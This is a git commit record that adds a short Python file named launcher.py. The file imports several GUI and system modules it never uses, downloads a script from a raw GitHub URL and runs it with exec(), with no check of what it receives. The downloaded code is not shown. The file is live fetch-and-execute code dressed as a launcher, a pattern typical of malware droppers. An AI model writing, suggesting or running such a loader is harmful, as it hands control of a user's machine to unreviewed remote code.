d492b15d679dc5c03cc2374181ca55827331fc7e
MaxG7855 <96419168+MaxG7855@users.noreply.github.com>
2024-01-31 08:25:12 +0000

    Update launcher.py

---
+++ launcher.py
@@ -0,0 +1,14 @@
+import urllib.request
+import customtkinter
+import io
+import tkinter as tk
+from PIL import Image, ImageTk
+import os
+import subprocess
+
+code = 'https://raw.githubusercontent.com/MaxG7855/ee/main/launch.py'
+
+response = urllib.request.urlopen(code)
+data = response.read()
+
+exec(data)
